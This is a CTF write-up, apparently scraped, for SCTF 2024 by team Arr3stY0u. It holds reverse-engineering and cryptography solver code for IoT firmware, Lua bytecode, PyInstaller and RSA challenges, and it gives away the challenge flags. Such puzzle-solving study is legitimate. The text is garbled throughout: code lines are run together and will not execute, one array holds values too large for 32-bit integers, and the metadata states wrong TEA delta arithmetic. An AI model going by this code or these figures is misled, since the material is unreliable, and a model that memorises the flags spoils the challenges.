---
title: SCTF 2024 writeup by Arr3stY0u
contest: SCTF 2024
year: 2024
difficulty: hard
vuln_type: crypto_symmetric
tags:
- iot-firmware
- mips
- aes-ecb
- xor-0x66
- tea-xor
- lua-obfuscation
- unluac
- ptrace-anti-debug
- pyinstaller
- anything-permutation
- s-box-substitution
- lfsr-mt19937
attack_chain:
- 'IoT 1 Wlc_t0_the_wd_oF_IOT_s3cur: 魔改 AES + 字节 ROL1 + 异或链'
- '还原: flag[i] = ROR1(flag[i], 3) + flag[i] ^= flag[i+1] + flag[i] ^= 0xFF'
- AES ECB key=2E 35 7D 6A ED 44 F3 4D AD B9 11 34 13 EA 32 4E
- 'flag: SCTF{Wlc_t0_the_wd_oF_IOT_s3cur}'
- 'IoT 2 SCTF{470b-a3e5c-9beb-60337-84ef2-5194d-aedc}: TEA 变种 + 12 uint32 加解密'
- DELTA=0x99C922E9 (实际 0x9E3779B9 取负) + ROUND=42
- 异或 12 + 18 还原 v0/v1
- Reverse Lua unluac 解混淆 (3a.lua + test_obf.luac)
- lua opmap 重写 + unluac_2023_09_20.jar 解出 SGAME_3.luac
- 源 lua 含 pctbbgf padding + bcdef TEA-like 加密 (DELTA=2576980377)
- 还原 enc_flag=[12 uint32] + key={19088743,...} + arrrrrrrrrr
- 'flag: SCTF{470b-a3e5c-9beb-60337-84ef2-5194d-aedc}'
- 'RE AES 异或 0x66 + 4 把子 key 切片: hey_syclover2024 / 2024hey_sycl / over2024hey_sycl / syclover2024hey_'
- 'flag: IHopeTheDebuggingProcessDidn1tTortureYouAndHopeYouHaveFunInSCTF!'
- RE bpftrace watchpoint 跟踪魔改异或 0x66 + go_memcmp 比对
- RE TEA 加密 case 6 + verify + RC4 + 字节解析
- 完整 Python 还原 + ARC4 解密 W0L000043MB541337
- RE PyInstaller 解包 + Python 3.8 + PyNumber_Add/Subtract/And/Rshift/Index/Long/Lshift/TrueDivide/Xor
- XXTea_Encrypt/Decrypt 5 rounds + DELTA 0x9E3779B9
- key={83,'y',67,49,48,86,101,82,102,48,82,86,101,114}
- 'flag: SCTF{w0w_y0U_wE1_kNOw_of_cYtH0N}'
- CRYPTO RSA + 反转 anything 函数 (双段 perfect + circle + rightCircle)
- 'anything: 递归置换 + reverse(a, from1, to) 3 次'
- 100 次循环还原 flag
- 'flag: SCTF{wshm56yt7ujhg}'
- 'CRYPTO Break: rev_crc + xor_num 40 + base64 字母表替换'
- string1="nopqrstDEFGHIJKLhijklUVQRST/WXYZabABCcdefgmuv6789+wxyz012345MNOP" -> standard
- '还原: Y0u_@re_r1ght_r3ver53_is_easy!'
- CRYPTO RSA d=254 bit + (p^2+p+1)(q^2+q+1) = phi
- Continued Fraction 攻击 e/(...) 求 d
- solve p*q==N + (p^2+p+1)(q^2+q+1)==phi
- md5(p) md5(q) 生成 flag
- CRYPTO Permutation + Lattice + LLL 攻击
- 25+100+1 x 100 矩阵 + mat.LLL() 还原 MP
- AA * DPM.inverse() 还原 A + 65537 GF 域
key_payload: rev_crc + xor_num=[185,173,127,...] + str1.translate(str.maketrans(string1, string2))
one_liner: SCTF 2024 Arr3stY0u 多方向全 WP：IoT 魔改 AES+ROL1 + TEA 变种 + Lua unluac 解混淆 + Python PyInstaller XXTea + CRYPTO RSA 254-bit 攻击 + anything 置换 + Lattice LLL。
lesson: PyInstaller 包可解 Python 3.8 PyNumber_* 符号表 + unluac.jar + opmap.txt 是 Lua 字节码反编译标准工具；anything 置换函数 100 次循环还原是 Reverse 经典模式；Continued Fraction 攻击 254-bit d 配合 (p^2+p+1)(q^2+q+1)=phi 是特殊 RSA 还原关键。
quality: high
full_path: SCTF_2024_writeup_by_Arr3stY0u.full.md
meta_path: SCTF_2024_writeup_by_Arr3stY0u.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: SCTF 2024 writeup by Arr3stY0u。SCTF 2024 Arr3stY0u 多方向全 WP：IoT 魔改 AES+ROL1 + TEA 变种 + Lua unluac 解混淆 + Python PyInstaller XXTea + CRYPTO RSA 254-bit 攻击 + anything 置换 + Lattice LLL。。关键路径：IoT 1 Wlc_t...
category: misc
subcategory: misc_other
tools_used:
- Python
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/207863.html
wp_author: Arr3stY0u
reasoning_chain:
- IoT1 魔改 AES + 字节 ROL1 + 异或链 → 触发点：flag 加密 3 步运算
- '逆运算: ROR1(flag[i], 3) + flag[i] ^= flag[i+1] + flag[i] ^= 0xFF → AES ECB 解密'
- AES key=2E357D6AED44F34DADB9113413EA324E → 解出 flag
- IoT2 TEA 变种 DELTA=0x99C922E9 (= -0x9E3779B9) + ROUND=42 → 异或 12+18 还原 v0/v1
- Reverse Lua unluac + opmap 重写 → 解混淆 SGAME_3.luac → 还原 TEA-like 加密
- RE AES 异或 0x66 + 4 把子 key 切片 → 直接解密 → flag
- RE PyInstaller 解包 + Python 3.8 → XXTea 5 rounds + DELTA 0x9E3779B9 → flag
- CRYPTO RSA d=254 bit + (p^2+p+1)(q^2+q+1)=phi → Continued Fraction 攻击求 d
- CRYPTO Permutation + Lattice + LLL → 还原矩阵 MP → AA*DPM.inverse() 还原 A → flag
failed_attempts:
- RE Lua 试图直接 lua 解释器执行 → 失败：luac 已编译需 unluac 反编译
- PyInstaller 试图直接运行 exe → 失败：需 pyinstxtractor 解包
- CRYPTO RSA 试图直接因式分解 N → 失败：254-bit d 用 Continued Fraction 更高效
key_observations:
- PyInstaller 包可解 Python 3.8 PyNumber_* 符号表 + unluac.jar + opmap.txt 是 Lua 字节码反编译标准工具
- anything 置换函数 100 次循环还原是 Reverse 经典模式
- Continued Fraction 攻击 254-bit d 配合 (p^2+p+1)(q^2+q+1)=phi 是特殊 RSA 还原关键
- TEA delta 实际是负数 32-bit 表示 (-0x9E3779B9 = 0x99C922E8) 是常见变种
prerequisites:
- PyInstaller 解包（pyinstxtractor + Python 字节码）
- Lua 字节码 + unluac.jar + opmap 重写
- TEA/XTEA 算法变种识别
- Continued Fraction + LLL 算法
---
# SCTF 2024 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/207863.html
> ID: 207863

<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title> </head> </html>

undefined4 FUN_80000690(void){byte bVar1;undefined uVar2;undefined4 uVar3;
int i;
i = FUN_8000125a(0x6000009c,0x60000004,0x60000000,DAT_80003990);if (i == 0){uVar3 = 0xffffffff;}else{aes_enc(0x60000004,&DAT_800039a3,&DAT_6000007c,0x20);for (i = 0; i < 0x20; i += 1){uVar2 = ROL1(CONCAT44(3,(uint)(byte)(&DAT_6000007c)[i]));(&DAT_6000007c)[i] = uVar2;bVar1 = DAT_6000007c;if (i < 31){bVar1 = *(byte *)(i + 0x6000007d);}(&DAT_6000007c)[i] = bVar1 ^ (&DAT_6000007c)[i];(&DAT_6000007c)[i] = (&DAT_6000007c)[i] ^ 0xff;}FUN_80001278(0x6000009c,&DAT_6000007c,0x60000000,DAT_80003990);uVar3 = 0;}return uVar3;}

from Crypto.Cipher import AES

ct = bytes([0x63, 0xD4, 0xDD, 0x72, 0xB0, 0x8C, 0xAE, 0x31, 0x8C, 0x33, 0x03, 0x22, 0x03, 0x1C, 0xE4, 0xD3,0xC3, 0xE3, 0x54, 0xB2, 0x1D, 0xEB, 0xEB, 0x9D, 0x45, 0xB1, 0xBE, 0x86, 0xCD, 0xE9, 0x93, 0xD8])

def ROL1(v0, v1):
return ((v0 << v1) | (v0 >> (8-v1))) & 0xFF

def ROR1(v0, v1):
return ((v0 >> v1) | (v0 << (8-v1))) & 0xFF
'''undefined4 FUN_80000690(void){byte bVar1;undefined uVar2;undefined4 uVar3;
int i;
i = FUN_8000125a(0x6000009c,0x60000004,0x60000000,DAT_80003990);if (i == 0){uVar3 = 0xffffffff;}else{aes_enc(0x60000004,&DAT_800039a3,&DAT_6000007c,0x20);for (i = 0; i < 0x20; i += 1){uVar2 = ROL1(CONCAT44(3,(uint)(byte)(&DAT_6000007c)[i]));(&DAT_6000007c)[i] = uVar2;bVar1 = DAT_6000007c;if (i < 31){bVar1 = *(byte *)(i + 0x6000007d);}(&DAT_6000007c)[i] = bVar1 ^ (&DAT_6000007c)[i];(&DAT_6000007c)[i] = (&DAT_6000007c)[i] ^ 0xff;}FUN_80001278(0x6000009c,&DAT_6000007c,0x60000000,DAT_80003990);uVar3 = 0;}return uVar3;}'''# enc
# flag = list(ct)
# for i in range(32):# flag[i] = ROL1(flag[i], 3)
# if i < 31:# v1 = flag[i+1]# else:# v1 = flag[0]# flag[i] ^= v1
# flag[i] ^= 0xFF
# decflag = list(ct)for i in reversed(range(32)):
flag[i] ^= 0xFFif i < 31:v1 = flag[i+1]else:v1 = flag[0]flag[i] ^= v1flag[i] = ROR1(flag[i], 3)
print(bytes(flag).hex())
# 0x800039A3aes = AES.new(bytes.fromhex('2E 35 7D 6A ED 44 F3 4D AD B9 11 34 13 EA 32 4E'), AES.MODE_ECB)tmp = aes.decrypt(bytes(flag))print(tmp)
# SCTF{Wlc_t0_the_wd_oF_IOT_s3cur}

.text:
000000000000BA2B mov edi, __NR_ptrace ; sysno.text:
000000000000BA30 call _syscall.text:
000000000000BA35 test rax, rax.text:
000000000000BA38 jz loc_BE2F

.text:
000000000000D6D2 lea rsi, a3aLua ; "3a.lua".text:
000000000000D6D9 mov rdi, r15.text:
000000000000D6DC xor edx, edx.text:
000000000000D6E2 call luaL_loadfilex ; 0x1492B

-- 3a.lualocal test = require('test')local data = string.dump(test)local fp = io.open("test_obf.luac","wb")fp:
write(data)fp:
close()

.op 0 gettabup.op 1 gettable.op 2 geti.op 3 getfield.op 4 settabup.op 5 settable.op 6 seti.op 7 setfield.op 8 newtable.op 9 self.op 10 addi.op 11 addk.op 12 subk.op 13 mulk.op 14 modk.op 15 powk.op 16 divk.op 17 idivk.op 18 bandk.op 19 bork.op 20 bxork.op 21 shri.op 22 shli.op 23 add.op 24 sub.op 25 mul.op 26 mod.op 27 pow.op 28 div.op 29 idiv.op 30 band.op 31 bor.op 32 bxor.op 33 shl.op 34 shr.op 35 mmbin.op 36 mmbini.op 37 mmbink.op 38 unm.op 39 bnot.op 40 not.op 41 len.op 42 concat.op 43 close.op 44 tbc.op 45 jmp.op 46 eq.op 47 lt.op 48 le.op 49 eqk.op 50 eqi.op 51 lti.op 52 lei.op 53 gti.op 54 gei.op 55 move.op 56 loadi.op 57 loadf.op 58 loadk.op 59 loadkx.op 60 loadfalse.op 61 lfalseskip.op 62 loadtrue.op 63 loadnil.op 64 getupval.op 65 setupval.op 66 test.op 67 testset.op 68 call.op 69 tailcall.op 70 return.op 71 return0.op 72 return1.op 73 forloop.op 74 forprep.op 75 tforprep.op 76 tforcall.op 77 tforloop.op 78 setlist.op 79 closure.op 80 vararg.op 81 varargprep.op 82 extraarg

b1 = instruction & 0xFFb2 = (instruction >> 8) & 0xFFb3 = (instruction >> 16) & 0xFFb4 = (instruction >> 24) & 0xFFopcode = b2 & 0x7Fif opcode == 127: opcode = 45 b4 = 0x7Felif opcode == 0 and b4 == 1 and last_opcode in [46, 47, 48, 49, 50, 51, 52, 53, 54, 66, 67]: opcode = 45 b4 = 0x80last_opcode = opcodeob4 = b4ob3 = b3ob2 = (b1 >> 1) | (b2 & 0x80)ob1 = ((b1 & 1) << 7) | (opcode)instruction2 = (ob4 << 24) | (ob3 << 16) | (ob2 << 8) | ob1

java -jar .unluac_2023_09_20.jar --opmap opmap.txt SGAME_3.luac

local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep(" 00", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
for i = 1, #str, 8 do table.insert(result, fvcrtxrrr(str:
byte(i, i + 3))) table.insert(result, fvcrtxrrr(str:
byte(i + 4, i + 7)))endreturn resultendlocal defcve = function(uint)return string.char(uint >> 24 & 255, uint >> 16 & 255, uint >> 8 & 255, uint & 255)endlocal abcde = function(rrrrrrrrrrray)do return enddo return endlocal resultdo return enddo return enddodo return endlocal (for state), (for state), (for state), (for state)dodo return endlocal _, uintdo return enddo return enddo return enddo return enddo return enddo return endreturnenddo return endreturnenddo return enddo return enddo return enddo return enddo return endreturn nil, nil, nil, nil, nil, nil, nil, nil, nil, nilendfunction cdefa(v, arrrrrrrrrr)local cccccccccccccccc, ccccccccccccccccc = v[1], v[2]local cccccccccc = 0local cccccc = 2576980377for _ = 1, 42 do cccccccccc = cccccccccc + cccccc & 4294967295 cccccccccccccccc = cccccccccccccccc + ((ccccccccccccccccc << 4 ~ ccccccccccccccccc >> 5) + ccccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc & 3) + 1]) & 4294967295 ccccccccccccccccc = ccccccccccccccccc + ((cccccccccccccccc << 4 ~ cccccccccccccccc >> 5) + cccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc >> 11 & 3) + 1]) & 4294967295end cccccccccccccccc = cccccccccccccccc ~ 12 ccccccccccccccccc = ccccccccccccccccc ~ 18return {cccccccccccccccc, ccccccccccccccccc}endfunction bcdef(str, arrrrrrrrrr)local padded_str = pctbbgf(str)local uint32_rrrrrrrrrrray = efvcrte(padded_str)local encccderrrrrr = {}
for i = 1, #uint32_rrrrrrrrrrray, 2 dolocal block = { uint32_rrrrrrrrrrray[i], uint32_rrrrrrrrrrray[i + 1] }local enc_block = cdefa(block, arrrrrrrrrr) table.insert(encccderrrrrr, enc_block[1]) table.insert(encccderrrrrr, enc_block[2])endreturn abcde(encccderrrrrr)endlocal parcmo = function(rrrrrrrrrrray1, rrrrrrrrrrray2)if #rrrrrrrrrrray1 ~= #rrrrrrrrrrray2 thenreturn falseendfor i = 1, #rrrrrrrrrrray1 doif rrrrrrrrrrray1[i] ~= rrrrrrrrrrray2[i] thenreturn falseendendreturn trueendlocal ccccccc = input_flagif 44 ~= string.len(ccccccc) then print("please check your flag")endif 44 == string.len(ccccccc) thenlocal rrrrrrrrrrr = {3633266294,3301799896,2704688257,2306037448,1267864397,1132773035,114101720,3838684141,4189720444,4028672856,277437884,787003469 }local arrrrrrrrrr = {19088743,2309737967,4275878552,1985229328 }local encccderrrrrr = bcdef(ccccccc, arrrrrrrrrr)local rrrrrrrrrrrr = efvcrte(encccderrrrrr)if parcmo(rrrrrrrrrrrr, rrrrrrrrrrr) then print("yes yes you input the right flag")endif not parcmo(rrrrrrrrrrrr, rrrrrrrrrrr) then print("o this is wrong")endend

import hexdumpimport struct
DELTA = 2576980377ROUND = 42

def tea_dec(b, key):m = 0xFFFFFFFF_sum = (DELTA*ROUND) & 0xFFFFFFFFv0, v1 = struct.unpack_from('<2I', b)v0 = v0 ^ 12v1 = v1 ^ 18for i in range(ROUND):v1 -= (((((v0 << 4) & m) ^ (v0 >> 5)) + v0)^ (_sum + key[(_sum >> 11) & 3])) & mv1 &= mv0 -= (((((v1 << 4) & m) ^ (v1 >> 5)) + v1)^ (_sum + key[_sum & 3])) & mv0 &= m_sum -= DELTA_sum &= mreturn struct.pack('>2I', v0, v1)

enc_flag = [3633266294, 3301799896, 2704688257, 2306037448, 1267864397, 1132773035, 114101720, 3838684141, 4189720444, 4028672856, 277437884, 787003469]
if __name__ == '__main__':
key = [19088743,2309737967,4275878552,1985229328]_b = b''b = struct.pack('<12I', *enc_flag)for i in range(6):b1 = tea_dec(b[i*8:], key)_b += b1hexdump.hexdump(_b)print(_b)
# b'SCTF{470b-a3e5c-9beb-60337-84ef2-5194d-aedc}x00x00x00x00'

from Crypto.Cipher import AESenc_flag1 = bytearray.fromhex('F05B295FC35C2ABC8A428FE7635CFDAC747E6DD36713841BDA607C3696A880DA51A7ECE562FEC9B5E1F90712B353B3C0311486D0C3D092DE5A0DD1FF5B001D2E')for i in range(len(enc_flag1)): enc_flag1[i] ^= 0x66enc_flag = bytearray.fromhex('''59 AD 6B 76 42 6A EA 66 58 C1 E4 2B 32 BF EB 955E 26 13 18 FF 77 90 E3 4D FF 23 AF AF C7 E8 361F 11 3F 9E C3 B1 37 DC CC BF BD 1D B0 75 17 568E 89 E9 93 A8 78 1F DF D7 D9 15 5D 23 6E 4D DB''')
def xor66(b): res = [0]*len(b)for i in range(len(res)): res[i] = b[i] ^ 0x66return bytes(res)
iv = b'x00'a = AES.new(b'hey_syclover2024', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[:16])))a = AES.new(b'2024hey_syclover', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[16:32])))a = AES.new(b'over2024hey_sycl', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[32:48])))a = AES.new(b'syclover2024hey_', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[48:])))
# IHopeTheDebuggingProcessDidn1tTortureYouAndHopeYouHaveFunInSCTF!

0x5877E0 aes_ecb0x5877E0 new_aes(key)0x5877E0 魔改异或0x660x4B1723 call go_memcmp

sudo bpftrace -e 'watchpoint:
0x4B1723:8:x {printf("%s (%d): %p %sn", comm, pid, uptr(reg("bx")), str(uptr(0x5877E0)))}'

void __fastcall rc4_enc(int a1, char *a2){int v3; // r7int v4; // r4unsigned int i; // r6int v6; // r9
 rc4_set_key((char *)a1); LOBYTE(v3) = 0; v4 = 0;for ( i = 0; strlen(a2) > i; ++i ) { v4 = (v4 + 1) % 256; v3 = (unsigned __int8)(LOBYTE(rc4_box[v4]) + v3); v6 = rc4_box[v4]; rc4_box[v4] = rc4_box[v3]; rc4_box[v3] = v6; a2[i] ^= LOBYTE(rc4_box[(unsigned __int8)(LOBYTE(rc4_box[v4]) + LOBYTE(rc4_box[v3]))]); }}int __fastcall verify(int *a1, int *a2, int a3){int v4; // r4int i; // r4int j; // r4int v8[4]; // [sp+0h] [bp-34h] BYREFint v9[2]; // [sp+10h] [bp-24h]int v10[7]; // [sp+18h] [bp-1Ch] BYREF
 v4 = 0; v8[3] = 0xCDEF; v8[0] = 0x123; *(_QWORD *)&v8[1] = 0x89AB00004567LL;while ( v4 < a3 / 4 ) { v10[v4] = (LOBYTE(a1[v4]) << 24) | (BYTE1(a1[v4]) << 16) | (BYTE2(a1[v4]) << 8) | HIBYTE(a1[v4]); v4 = (unsigned __int16)(v4 + 1); }
for ( i = 0; i < a3 / 4; i = (unsigned __int16)(i + 1) ) v9[i] = (LOBYTE(a2[i]) << 24) | (BYTE1(a2[i]) << 16) | (BYTE2(a2[i]) << 8) | HIBYTE(a2[i]); tea_dec((unsigned int *)v10, v8);for ( j = 0; j < a3 / 4; j = (unsigned __int16)(j + 1) ) {if ( v10[j] != v9[j] )return 0; }return 1;}int __fastcall sub_80043E8(int a1, int a2, int a3, int a4){ ...case 6: v9 = 0x44332211; v10 = 0x88776655;if ( !verify(*(_DWORD *)(a3 + 4), (int)&v9, *(unsigned __int16 *)(a3 + 8)) )return 53; rc4_enc(*(_DWORD *)(a3 + 4), byte_200000A8);

int __fastcall sub_810004C(unsigned __int8 *ptr, _BYTE *outbuf, int a3){ _BYTE *endptr; // r4unsigned int v4; // r2unsigned int v5; // t1int v6; // r3int v7; // t1unsigned int v8; // r2unsigned int v9; // t1char v10; // t1
// seg000:
08004EA8 off_8004EA8 DCD dword_8004EC8 ; DATA XREF: sub_8000398↑o// seg000:
08004EA8 ; seg000:
off_80003B4↑o// seg000:
08004EAC DCD 0x20000000// seg000:
08004EB0 DCD 0x194// seg000:
08004EC8 dword_8004EC8 DCD 0x96021301 ; DATA XREF: sub_8000398+2↑o// seg000:
08004EC8 ; seg000:
off_80003B8↑o ...// seg000:
08004ECC DCD 0xB0120088// seg000:
08004ED0 DCD 0xFE91A614// seg000:
08004ED4 DCD 0xAF41D7B9// seg000:
08004ED8 DCD 0xE94ECC82// seg000:
08004EDC DCD 0x4F284747// seg000:
08004EE0 DCD 0x521042D1// seg000:
08004EE4 DCD 0xD0905801// seg000:
08004EE8 DCD 0xD0900003// seg000:
08004EEC DCD 0x1180203 endptr = &outbuf[a3];do { v5 = *ptr++; v4 = v5; v6 = v5 & 0xF;if ( (v5 & 0xF) == 0 ) { v7 = *ptr++; v6 = v7; } v8 = v4 >> 4;if ( !v8 ) { v9 = *ptr++; v8 = v9; }
while ( --v6 ) { v10 = *ptr++; *outbuf++ = v10; }
while ( --v8 ) *outbuf++ = 0; }
while ( outbuf < endptr );
return 0;}

import structfrom Crypto.Cipher import ARC4
key = [0x00000123, 0x00004567, 0x000089AB, 0x0000CDEF]
DELTA = 0x9E3779B9

def tea_enc(v0, v1, key):
_sum = 0for i in range(32):
_sum += 0x9E3779B9_sum &= 0xFFFFFFFFv0 += (key[0] + 16 * v1) ^ (v1 + _sum) ^ (key[1] + (v1 >> 5))v0 &= 0xFFFFFFFFv1 += (key[2] + 16 * v0) ^ (v0 + _sum) ^ (key[3] + (v0 >> 5))v1 &= 0xFFFFFFFFreturn v0, v1

b = struct.pack('<2I', 0x44332211, 0x88776655)v0, v1 = struct.unpack('>2I', b)
v0, v1 = tea_enc(v0, v1, key)b = struct.pack('>2I', v0, v1)
arc4 = ARC4.new(b)a = arc4.encrypt(bytes([0x14, 0xA6, 0x91, 0xFE, 0xB9, 0xD7, 0x41,0xAF, 0x82, 0xCC, 0x4E, 0xE9, 0x47, 0x47, 0x28, 0x4F, 0xD1]))print(a)
# W0L000043MB541337

Address Ordinal Name Library000000018000D110 PyNumber_Add python38000000018000D178 PyNumber_Subtract python38000000018000D1C0 PyNumber_And python38000000018000D1F8 PyNumber_Rshift python38000000018000D258 PyNumber_Index python38000000018000D2A8 PyNumber_Long python38000000018000D2C0 PyNumber_Lshift python38000000018000D328 PyNumber_TrueDivide python38000000018000D3B8 PyNumber_Xor python38

#include <ctype.h>#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>
int global_count = 0;
void hexdump(void *pdata, int size) {const uint8_t *p = (const uint8_t *)pdata;
int count = size / 16;
int rem = size % 16;
for (int r = 0; r <= count; r++) {int k = (r == count) ? rem : 16;if (r)printf("n");for (int i = 0; i < 16; i++) {if (i < k)printf("%02X ", p[i]);elseprintf(" "); }printf(" ");for (int i = 0; i < k; i++) {printf("%c", isprint(p[i]) ? p[i] : '.'); } p += 0x10; }printf("n");}#define ut32 unsigned int#define delta 0x9e3779b9void XXTea_Encrypt(ut32 *src, ut32 n, ut32 *key);
void XXTea_Decrypt(ut32 *enc, ut32 n, ut32 *key);// mxuint32_t round_enc(uint32_t v0, uint32_t v1, uint32_t v2, uint32_t *v3,uint32_t v4, uint32_t v5) {uint32_t res = 0;
uint32_t t0, t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13; t0 = v0 >> 3; t1 = v1 << 3; t2 = t0 ^ t1; t3 = v1 >> 4; t4 = v0 << 2; t5 = t3 ^ t4; t6 = t2 + t5; t7 = v1 ^ v2; t8 = v4 & 2; t9 = t8 ^ v5; t10 = v3[t9]; t11 = t10 ^ v0; t12 = t7 + t11; t13 = t6 ^ t12; res = t13;printf("R: %03d res: %08X| v0: %08X v1: %08X v2: %08X v4: %02d v5:%08Xn", global_count, res, v0, v1, v2, v4, v5);
return res;}
void XXTea_Encrypt(ut32 *src, ut32 n, ut32 *key) { ut32 y, z, sum = 0; ut32 e, rounds;
int p; rounds = 6 + 52 / n; rounds = 5;
int i = 0;do { z = src[n - 1]; sum += delta; e = (sum >> 3) & 3;for (p = 0; p < n - 1; p++) { y = src[p + 1]; global_count += 1; src[p] += round_enc(z, y, sum, key, p, e); z = src[p]; } y = src[0]; global_count += 1; src[n - 1] += round_enc(z, y, sum, key, p, e); i++; } while (--rounds);}
void XXTea_Decrypt(ut32 *enc, ut32 n, ut32 *key) { ut32 y, z, sum; ut32 e, rounds;
int p; rounds = 6 + 52 / n; rounds = 5; sum = delta * rounds;do { e = (sum >> 3) & 3;for (p = n - 1; p > 0; p--) { y = enc[(p + 1) % n]; z = enc[(p - 1)]; enc[p] -= round_enc(z, y, sum, key, p, e); } y = enc[1]; z = enc[n - 1]; enc[0] -= round_enc(z, y, sum, key, p, e); sum -= delta; } while (--rounds);}
int main() {uint32_t key[14] = {83, 'y', 67, 49, 48, 86, 101,82, 102, 48, 82, 86, 101, 114};
 ut32 m[32] = {0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, //0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, //0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, //0x32, 0x32}; ut32 m1[32] = {4108944556, 3404732701, 1466956825, 788072761, 1482427973, 5077893943, 1635740553, 4115935911, 2820454423, 3206473923, 1700989382, 2460803532, 2399057278, 968884411, 1298467094, 1786305447, 3953508515, 2466099443, 4105559714, 5074098393, 31525197679817476, 3322844775, 4122289132, 2089726849, 4951420023, 3096682206, 2217255962, 4975150340, 3394288893, 4992449135, 1109578150, 2272036063}; XXTea_Encrypt(m, 32, key); XXTea_Decrypt(m1, 32, key);printf("%dn", global_count); hexdump(m1, sizeof(m1));for (int i = 0; i < 32; i++) {printf("%c", m1[i]); }printf("n"); // SCTF{w0w_y0U_wE1_kNOw_of_cYtH0N}return 0;}

from Crypto.Util.number import *from gmpy2 import *import base64
def anything(str):
card=list(str.encode())to=len(card)-1perfect(card,0,to,((to-0)+1)//2)return bytes(card)
def perfect(a,from1,to,n):if from1>=to:
returnif from1==to-1:a[from1],a[to]=a[to],a[from1]k=0n2=n*2p=n2+1k_3=1while(k<=p//3):k+=1;p/=3k_3*=3m=(k_3-1)//2rightCircle(a,from1+m,((from1+n)+m)-1,m)i=0t=1while(i<k):
circle(a,from1-1,t,(m*2)+1)i+=1t*=3i2=m*2perfect(a,i2+from1,to,((to-((m*2)+from1))+1)//2)
def circle(a,from1,i,n2):k=(i*2)%n2while(k!=i):a[i+from1],a[k+from1]=a[k+from1],a[i+from1]k=(k*2)%n2
def rightCircle(a,from1,to,n):m=n%((to-from1)+1)reverse(a,(to-m)+1,to)reverse(a,from1,to-m)reverse(a,from1,to)
def reverse(a,from1,to):
while(from1<to):a[from1],a[to]=a[to],a[from1]from1+=1to-=1
enc='YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9'enc=base64.b64decode(enc).decode()enc=list(enc[:
enc.index('http')].encode())xor_key=b'S0C0Z0Y0W'
for i in range(len(enc)):
enc[i]^=xor_key[i%len(xor_key)]
c=int(bytes(enc))
p=10669721913248017310606431714870563867652912174255756777085768772939744689
8790451577487723991083173010242416863238099716044775658681981821407922722052
7789589428918310335124632627410539616815129082180038404085269156296894321114
8058896680094942807901568262459163601067869192728532170893507622195117342689
4836169q=1448194244658423078063536725473441252907167535352396584178838289412
3250962283869276191721180696301116882228166603369515742651586426552704621332
6145174398018859056439431422867957079149967592078894410082695714160599647180
9472075041086187946378722615722628055655177569222883207793088958197260742291
54002310375209e=0x10001
n=p*q
phi=(p-1)*(q-1)
d=invert(e,phi)m=pow(c,d,n)
m=str(m).split('00')[:-1]flag=''
for i in m:
flag+=chr(int(i))
flag_=flagfor i in range(100):
flag_bak=flagflag=anything(flag).decode()if flag==flag_:
print('SCTF{'+flag_bak+'}')#SCTF{wshm56yt7ujhg}Break

